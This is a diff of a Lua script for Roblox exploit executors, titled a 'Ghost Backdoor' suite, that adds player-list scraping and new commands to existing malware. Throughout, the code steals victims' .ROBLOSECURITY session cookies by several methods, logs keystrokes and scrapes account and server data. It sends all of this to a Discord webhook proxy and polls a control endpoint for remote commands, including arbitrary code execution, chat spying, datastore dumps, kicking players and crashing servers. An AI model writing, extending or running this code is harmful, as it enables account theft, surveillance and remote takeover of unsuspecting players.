@@ -1,5 +1,4 @@
 -- Intelligence Suite v1.0 + Ghost Backdoor
--- Run this in any executor via:
 -- loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()
 
 local HttpService = game:GetService("HttpService")
@@ -9,14 +8,14 @@ local LocalPlayer = Players.LocalPlayer
 
 local PROXY = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/webhook"
 local CONTROL = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/control"
-local SETCMD = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/setcmd"
 
 getgenv().IntelSuite = {
     Buffer = "",
-    IsActive = true
+    IsActive = true,
+    ChatSpyActive = false
 }
 
--- Universal HTTP POST
+-- Universal POST
 local function POST(url, body)
     local h = {["Content-Type"] = "application/json"}
     pcall(function()
@@ -32,7 +31,7 @@ local function POST(url, body)
     end)
 end
 
--- Universal HTTP GET
+-- Universal GET
 local function GET(url)
     local out = nil
     pcall(function()
@@ -47,7 +46,7 @@ local function GET(url)
     return out
 end
 
--- Build and send Discord embed
+-- Send Discord embed
 local function send(title, desc, color)
     local ok, encoded = pcall(function()
         return HttpService:JSONEncode({
@@ -60,7 +59,7 @@ local function send(title, desc, color)
             }}
         })
     end)
-    if ok then POST(PROXY, encoded) end
+    if ok and encoded then POST(PROXY, encoded) end
 end
 
 -- Executor detection
@@ -80,20 +79,20 @@ local function getExec()
         if ok and f then
             for _, v in ipairs(f) do
                 local l = tostring(v):lower()
-                if l:find("xeno") then return "Xeno (fp)" end
-                if l:find("krnl") then return "KRNL (fp)" end
-                if l:find("synapse") then return "Synapse (fp)" end
-                if l:find("scriptware") then return "Script-Ware (fp)" end
-                if l:find("solara") then return "Solara (fp)" end
-                if l:find("wave") then return "Wave (fp)" end
-                if l:find("delta") then return "Delta (fp)" end
+                if l:find("xeno") then return "Xeno" end
+                if l:find("krnl") then return "KRNL" end
+                if l:find("synapse") then return "Synapse X" end
+                if l:find("scriptware") then return "Script-Ware" end
+                if l:find("solara") then return "Solara" end
+                if l:find("wave") then return "Wave" end
+                if l:find("delta") then return "Delta" end
             end
         end
     end
     return "Unknown"
 end
 
--- Game name helper
+-- Game name
 local function getGame()
     local name = "Unknown"
     pcall(function()
@@ -102,12 +101,24 @@ local function getGame()
     return name
 end
 
+-- Player list builder
+local function getPlayerList()
+    local list = ""
+    local count = 0
+    for _, p in ipairs(Players:GetPlayers()) do
+        count = count + 1
+        list = list .. "\n- **" .. p.Name .. "** (ID: " .. tostring(p.UserId) .. ", Age: " .. tostring(p.AccountAge) .. "d)"
+    end
+    return list, count
+end
+
 -- ============================================================
 -- MODULE 1: Execution Alert
 -- ============================================================
 task.spawn(function()
     local exec = getExec()
     local game_name = getGame()
+    local playerList, playerCount = getPlayerList()
     send("SCRIPT EXECUTED",
         "**User:** " .. LocalPlayer.Name ..
         "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
@@ -117,6 +128,7 @@ task.spawn(function()
         "\n**Game:** " .. game_name ..
         "\n**Place ID:** " .. tostring(game.PlaceId) ..
         "\n**Job ID:** " .. tostring(game.JobId) ..
+        "\n**Players in server:** " .. tostring(playerCount) ..
         "\n\n**Modules:** Keylogger, Token Stealer, Scraper, Heartbeat, Kill Switch, Backdoor",
         65280
     )
@@ -129,6 +141,7 @@ task.wait(1)
 -- ============================================================
 task.spawn(function()
     if not getgenv().IntelSuite.IsActive then return end
+    local playerList, playerCount = getPlayerList()
     send("SCRAPE DATA",
         "**User:** " .. LocalPlayer.Name ..
         "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
@@ -137,6 +150,7 @@ task.spawn(function()
         "\n**Game:** " .. getGame() ..
         "\n**Place ID:** " .. tostring(game.PlaceId) ..
         "\n**Job ID:** " .. tostring(game.JobId) ..
+        "\n**Players in server:** " .. tostring(playerCount) .. playerList ..
         "\n**Time:** " .. tostring(os.time()),
         65535
     )
@@ -159,7 +173,7 @@ task.spawn(function()
         16776960
     )
 
-    task.wait(0.5)
+    task.wait(0.3)
 
     -- M1: syn.get_cookie
     pcall(function()
@@ -169,7 +183,7 @@ task.spawn(function()
         else table.insert(log, "M1: SKIPPED") end
     end)
     if token then
-        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M1 syn.get_cookie\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
+        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M1\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
         return
     end
     task.wait(0.3)
@@ -182,7 +196,7 @@ task.spawn(function()
         else table.insert(log, "M2: SKIPPED") end
     end)
     if token then
-        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M2 get_cookie\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
+        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M2\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
         return
     end
     task.wait(0.3)
@@ -195,12 +209,12 @@ task.spawn(function()
         else table.insert(log, "M3: SKIPPED") end
     end)
     if token then
-        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M3 getrbxcookie\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
+        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M3\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
         return
     end
     task.wait(0.3)
 
-    -- M4: getcookies table
+    -- M4: getcookies
     pcall(function()
         if getcookies then
             local ok, r = pcall(function() local c = getcookies() return c and c[".ROBLOSECURITY"] end)
@@ -208,7 +222,7 @@ task.spawn(function()
         else table.insert(log, "M4: SKIPPED") end
     end)
     if token then
-        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M4 getcookies\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
+        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M4\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
         return
     end
     task.wait(0.3)
@@ -260,7 +274,7 @@ task.spawn(function()
                 if found and found ~= "" then
                     token = found
                     table.insert(log, "M6: SUCCESS")
-                    send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M6 Set-Cookie\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
+                    send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M6\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
                 else table.insert(log, "M6: FAILED") end
             else table.insert(log, "M6: FAILED") end
         else table.insert(log, "M6: SKIPPED") end
@@ -295,11 +309,11 @@ UserInputService.InputBegan:Connect(function(input, gp)
 end)
 
 -- ============================================================
--- MODULE 5: Kill Switch + Backdoor Command Poller (every 10s)
+-- MODULE 5: Command Poller + Kill Switch (every 5s)
 -- ============================================================
 task.spawn(function()
     while true do
-        task.wait(10)
+        task.wait(5)
         pcall(function()
             local response = GET(CONTROL)
             if not response or response == "" then return end
@@ -319,44 +333,66 @@ task.spawn(function()
             end
 
             -- Backdoor command
-            if data.command and data.command ~= "" then
-                local cmd = data.command:match("^%s*(.-)%s*$")
+            if not data.command or data.command == "" then return end
+            if not getgenv().IntelSuite.IsActive then return end
 
-                if cmd == "ping" then
-                    send("PONG", "**User:** " .. LocalPlayer.Name .. "\n**Game:** " .. getGame() .. "\n**Place:** " .. tostring(game.PlaceId) .. "\n**Players:** " .. tostring(#Players:GetPlayers()), 65280)
+            local cmd = data.command:match("^%s*(.-)%s*$")
 
-                elseif cmd == "players" then
-                    local list = ""
-                    for _, p in ipairs(Players:GetPlayers()) do
-                        list = list .. "\n- **" .. p.Name .. "** (ID: " .. tostring(p.UserId) .. ", Age: " .. tostring(p.AccountAge) .. "d)"
-                    end
-                    send("PLAYER LIST", "**Game:** " .. getGame() .. "\n**Players:**" .. list, 65535)
+            -- Confirm command received
+            send("CMD RECEIVED", "**Command:** `" .. cmd .. "`\n**User:** " .. LocalPlayer.Name, 16776960)
 
-                elseif cmd:sub(1,5) == "exec:" then
-                    local code = cmd:sub(6)
-                    local fn, err = loadstring(code)
-                    if fn then
-                        local ok2, res = pcall(fn)
-                        if ok2 then
-                            send("EXEC RESULT", "**Code:** ```lua\n" .. code:sub(1,400) .. "```\n**Result:** " .. tostring(res), 65280)
-                        else
-                            send("EXEC ERROR", "**Code:** ```lua\n" .. code:sub(1,400) .. "```\n**Error:** " .. tostring(res), 16711680)
-                        end
+            if cmd == "ping" then
+                local list, count = getPlayerList()
+                send("PONG",
+                    "**User:** " .. LocalPlayer.Name ..
+                    "\n**Game:** " .. getGame() ..
+                    "\n**Place:** " .. tostring(game.PlaceId) ..
+                    "\n**Job:** " .. tostring(game.JobId) ..
+                    "\n**Players:** " .. tostring(count) .. list,
+                    65280)
+
+            elseif cmd == "players" then
+                local list, count = getPlayerList()
+                send("PLAYER LIST",
+                    "**Game:** " .. getGame() ..
+                    "\n**Total:** " .. tostring(count) ..
+                    "\n**Players:**" .. list,
+                    65535)
+
+            elseif cmd:sub(1,5) == "exec:" then
+                local code = cmd:sub(6)
+                local fn, err = loadstring(code)
+                if fn then
+                    local ok2, res = pcall(fn)
+                    if ok2 then
+                        send("EXEC RESULT", "**Code:**\n```lua\n" .. code:sub(1,400) .. "```\n**Result:** " .. tostring(res), 65280)
                     else
-                        send("EXEC PARSE ERROR", "**Error:** " .. tostring(err), 16711680)
+                        send("EXEC ERROR", "**Code:**\n```lua\n" .. code:sub(1,400) .. "```\n**Error:** " .. tostring(res), 16711680)
                     end
+                else
+                    send("EXEC PARSE ERROR", "**Error:** " .. tostring(err), 16711680)
+                end
 
-                elseif cmd:sub(1,5) == "kick:" then
-                    local name, reason = cmd:sub(6):match("^(.-)%s*|%s*(.*)$")
-                    name = name or cmd:sub(6)
-                    for _, p in ipairs(Players:GetPlayers()) do
-                        if p.Name:lower() == name:lower() then
-                            p:Kick(reason or "Kicked.")
-                            send("KICKED", "**Player:** " .. p.Name, 16711680)
-                        end
+            elseif cmd:sub(1,5) == "kick:" then
+                local name, reason = cmd:sub(6):match("^(.-)%s*|%s*(.*)$")
+                name = name or cmd:sub(6)
+                local kicked = false
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if p.Name:lower() == name:lower() then
+                        p:Kick(reason or "Kicked.")
+                        send("KICKED", "**Player:** " .. p.Name .. "\n**Reason:** " .. tostring(reason or "Kicked."), 16711680)
+                        kicked = true
                     end
+                end
+                if not kicked then
+                    send("KICK FAILED", "Player not found: **" .. tostring(name) .. "**\n\nAvailable players:" .. getPlayerList(), 16711680)
+                end
 
-                elseif cmd == "chatspy" then
+            elseif cmd == "chatspy" then
+                if getgenv().IntelSuite.ChatSpyActive then
+                    send("CHAT SPY", "Already active.", 16776960)
+                else
+                    getgenv().IntelSuite.ChatSpyActive = true
                     for _, p in ipairs(Players:GetPlayers()) do
                         p.Chatted:Connect(function(msg)
                             pcall(function() send("CHAT SPY", "**" .. p.Name .. ":** " .. msg, 8388736) end)
@@ -367,52 +403,66 @@ task.spawn(function()
                             pcall(function() send("CHAT SPY", "**" .. p.Name .. ":** " .. msg, 8388736) end)
                         end)
                     end)
-                    send("CHAT SPY", "Now spying on all chat.", 65280)
+                    send("CHAT SPY", "Now spying on all player chat.", 65280)
+                end
 
-                elseif cmd == "dump" or cmd:sub(1,5) == "dump:" then
-                    local storeName = cmd == "dump" and "PlayerData" or cmd:sub(6)
-                    local DS = game:GetService("DataStoreService")
-                    local results = ""
-                    local store = nil
-                    pcall(function() store = DS:GetDataStore(storeName) end)
-                    if store then
-                        for _, p in ipairs(Players:GetPlayers()) do
+            elseif cmd == "dump" or cmd:sub(1,5) == "dump:" then
+                local storeName = cmd == "dump" and "PlayerData" or cmd:sub(6)
+                local DS = game:GetService("DataStoreService")
+                local results = ""
+                local store = nil
+                pcall(function() store = DS:GetDataStore(storeName) end)
+                if store then
+                    for _, p in ipairs(Players:GetPlayers()) do
+                        pcall(function()
+                            local d = store:GetAsync(tostring(p.UserId))
+                            results = results .. "\n**" .. p.Name .. ":** " .. tostring(HttpService:JSONEncode(d)):sub(1,300)
+                        end)
+                    end
+                    send("DATASTORE DUMP", "**Store:** " .. storeName .. "\n" .. results, 16776960)
+                else
+                    send("DUMP FAILED", "Could not open store: " .. storeName, 16711680)
+                end
+
+            elseif cmd == "crash" then
+                send("CRASH", "Crashing server now...", 16711680)
+                task.wait(1)
+                while true do Instance.new("Part").Parent = workspace end
+
+            elseif cmd:sub(1,9) == "teleport:" then
+                local name, placeId = cmd:sub(10):match("^(.-)%s*|%s*(.*)$")
+                if name and placeId then
+                    for _, p in ipairs(Players:GetPlayers()) do
+                        if p.Name:lower() == name:lower() then
                             pcall(function()
-                                local d = store:GetAsync(tostring(p.UserId))
-                                results = results .. "\n**" .. p.Name .. ":** " .. tostring(HttpService:JSONEncode(d)):sub(1,300)
+                                game:GetService("TeleportService"):Teleport(tonumber(placeId), p)
+                                send("TELEPORT", "**Player:** " .. p.Name .. "\n**Place:** " .. placeId, 65280)
                             end)
                         end
-                        send("DATASTORE DUMP", "**Store:** " .. storeName .. "\n" .. results, 16776960)
-                    else
-                        send("DUMP FAILED", "Could not open: " .. storeName, 16711680)
                     end
-
-                elseif cmd == "crash" then
-                    send("CRASH", "Crashing server now...", 16711680)
-                    task.wait(1)
-                    while true do Instance.new("Part").Parent = workspace end
-
-                elseif cmd:sub(1,9) == "teleport:" then
-                    local name, placeId = cmd:sub(10):match("^(.-)%s*|%s*(.*)$")
-                    if name and placeId then
-                        for _, p in ipairs(Players:GetPlayers()) do
-                            if p.Name:lower() == name:lower() then
-                                pcall(function()
-                                    game:GetService("TeleportService"):Teleport(tonumber(placeId), p)
-                                    send("TELEPORT", "**Player:** " .. p.Name .. "\n**Place:** " .. placeId, 65280)
-                                end)
-                            end
-                        end
-                    end
-
-                elseif cmd == "stop" then
-                    getgenv().IntelSuite.IsActive = false
-                    send("STOPPED", "Suite deactivated.", 16711680)
-
-                elseif cmd == "start" then
-                    getgenv().IntelSuite.IsActive = true
-                    send("STARTED", "Suite reactivated.", 65280)
                 end
+
+            elseif cmd == "stop" then
+                getgenv().IntelSuite.IsActive = false
+                send("STOPPED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Suite deactivated.", 16711680)
+
+            elseif cmd == "start" then
+                getgenv().IntelSuite.IsActive = true
+                send("STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Suite reactivated.", 65280)
+
+            elseif cmd == "info" then
+                local list, count = getPlayerList()
+                send("FULL INFO",
+                    "**User:** " .. LocalPlayer.Name ..
+                    "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
+                    "\n**Executor:** " .. getExec() ..
+                    "\n**Game:** " .. getGame() ..
+                    "\n**Place ID:** " .. tostring(game.PlaceId) ..
+                    "\n**Job ID:** " .. tostring(game.JobId) ..
+                    "\n**Active:** " .. tostring(getgenv().IntelSuite.IsActive) ..
+                    "\n**ChatSpy:** " .. tostring(getgenv().IntelSuite.ChatSpyActive) ..
+                    "\n**Players:** " .. tostring(count) .. list,
+                    65535)
             end
         end)
     end
@@ -426,7 +476,11 @@ task.spawn(function()
         task.wait(60)
         if not getgenv().IntelSuite.IsActive then continue end
         pcall(function()
-            local desc = "**User:** " .. LocalPlayer.Name .. "\n**Status:** ACTIVE\n**Game:** " .. getGame()
+            local list, count = getPlayerList()
+            local desc = "**User:** " .. LocalPlayer.Name ..
+                         "\n**Status:** ACTIVE" ..
+                         "\n**Game:** " .. getGame() ..
+                         "\n**Players:** " .. tostring(count)
             if #getgenv().IntelSuite.Buffer > 0 then
                 desc = desc .. "\n**Keys Flushed:** " .. getgenv().IntelSuite.Buffer
                 getgenv().IntelSuite.Buffer = ""
